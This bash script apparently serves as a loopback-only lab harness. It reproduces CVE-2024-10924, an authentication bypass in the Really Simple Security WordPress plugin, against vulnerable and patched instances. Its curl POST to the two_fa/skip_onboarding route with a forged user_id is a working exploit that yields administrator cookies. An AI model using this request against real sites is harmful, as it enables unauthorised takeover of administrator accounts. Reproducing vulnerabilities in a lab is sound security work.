#!/usr/bin/env bash
# Ca A — CVE-2024-10924 (Really Simple Security auth bypass via 2FA REST API).
# Reproduction matrix (loopback ONLY). Ground truth via wp-cli; exploit via curl.
#
# States:
#   A1  9.1.1.1 + 2FA ON   (expect bypass)
#   A2  9.1.1.1 + 2FA OFF  (expect route absent -> no bypass)
#   A3  9.1.2   + 2FA ON   (patched -> expect no bypass)
#
# SAFETY: 127.0.0.1 only, no CGI, no filesystem outside the WP container.
set -u
LAB="$HOME/pilot-lab"
CLI_IMG="wordpress:cli-php8.2"
ROUTE="/?rest_route=/reallysimplessl/v1/two_fa/skip_onboarding"
NONCE="RQ-C1-NOT-A-VALID-NONCE"

wpcli() { # $1=dir $2=db ; rest = wp args
  local dir="$1" db="$2"; shift 2
  docker run --rm -u 33 --network pilot-net \
    -v "$LAB/$dir:/var/www/html" \
    -e WORDPRESS_DB_HOST=db:3306 -e WORDPRESS_DB_NAME="$db" \
    -e WORDPRESS_DB_USER=labuser -e WORDPRESS_DB_PASSWORD=${DB_PASSWORD:-changeme} \
    -e WORDPRESS_TABLE_PREFIX=wp_ "$CLI_IMG" wp "$@"
}
set2fa() { # $1=dir $2=db $3=0|1
  wpcli "$1" "$2" eval \
    "rsssl_update_option('login_protection_enabled', $3);" >/dev/null
}

run_state() { # $1=label $2=dir $3=db $4=port $5=2fa(0|1) $6=user_id
  local label="$1" dir="$2" db="$3" port="$4" fa="$5" uid="$6"
  local jar="/tmp/caA.$port.jar" hdr="/tmp/caA.$port.hdr" body="/tmp/caA.$port.body"
  local adm="/tmp/caA.$port.admin"
  echo "=================================================================="
  echo "## STATE $label  (http://127.0.0.1:$port)"
  echo "=================================================================="
  echo "-- ground truth --"
  echo "   plugin version : $(wpcli "$dir" "$db" plugin get really-simple-ssl --field=version 2>/dev/null)"
  set2fa "$dir" "$db" "$fa"
  echo "   login_protection_enabled = $(wpcli "$dir" "$db" option get rsssl_options --format=json 2>/dev/null | jq -r '.login_protection_enabled' 2>/dev/null)"
  echo "   user_id ${uid} login  = $(wpcli "$dir" "$db" user get "$uid" --field=user_login 2>/dev/null)"

  echo "-- request --"
  echo "   POST $ROUTE"
  echo "   body: user_id=$uid&login_nonce=$NONCE&redirect_to=/wp-admin/"

  rm -f "$jar" "$hdr" "$body" "$adm"
  curl -s -D "$hdr" -o "$body" -c "$jar" -X POST \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data "user_id=$uid&login_nonce=$NONCE&redirect_to=/wp-admin/" \
    "http://127.0.0.1:$port$ROUTE"

  echo "-- response --"
  sed -n '1p' "$hdr" | sed 's/^/   status: /'
  echo "   Set-Cookie names: $(grep -i '^set-cookie' "$hdr" | sed -E 's/^Set-Cookie: ([^=]+)=([^;]*).*/   \1=<value>/' | tr -d '\r' | paste -sd' | ' -)"
  echo "   Set-Cookie wordpress_logged_in decoded prefix: $(grep -io 'wordpress_logged_in[^=]*=[^;]*' "$hdr" | head -1 | sed -E 's/^[^=]+=([^|]*\|[^|]*\|).*/user=\1.../')"
  echo "   body: $(cat "$body" | tr -d '\r' | head -c 200)"

  echo "-- decisive check: authenticated admin? --"
  local code
  code=$(curl -s -b "$jar" -o "$adm" -w '%{http_code}' "http://127.0.0.1:$port/wp-admin/users.php")
  echo "   GET /wp-admin/users.php -> $code"
  echo "   wp-settings cookie for user $uid: $(grep -c "wp-settings-$uid" "$jar")"
  echo "   wp-admin-bar present: $(grep -c 'wp-admin-bar' "$adm")"
  echo "   login form present  : $(grep -c 'name=\"log\"' "$adm")"
  if [ "$code" = "200" ] && ! grep -q 'name="log"' "$adm"; then
    echo "   RESULT: BYPASS SUCCEEDED (authenticated as uid $uid)"
  else
    echo "   RESULT: NO BYPASS"
  fi
  echo
}

run_state "A1 / 9.1.1.1 / 2FA ON " "wordpress/vuln/html"  "wp_vuln"  8081 1 1
run_state "A2 / 9.1.1.1 / 2FA OFF" "wordpress/vuln/html"  "wp_vuln"  8081 0 1
run_state "A3 / 9.1.2 / 2FA ON   " "wordpress/fixed/html" "wp_fixed" 8082 1 1

echo "== restore final state: both instances 2FA ON =="
set2fa "wordpress/vuln/html"  "wp_vuln"  1
set2fa "wordpress/fixed/html" "wp_fixed" 1
echo "done."
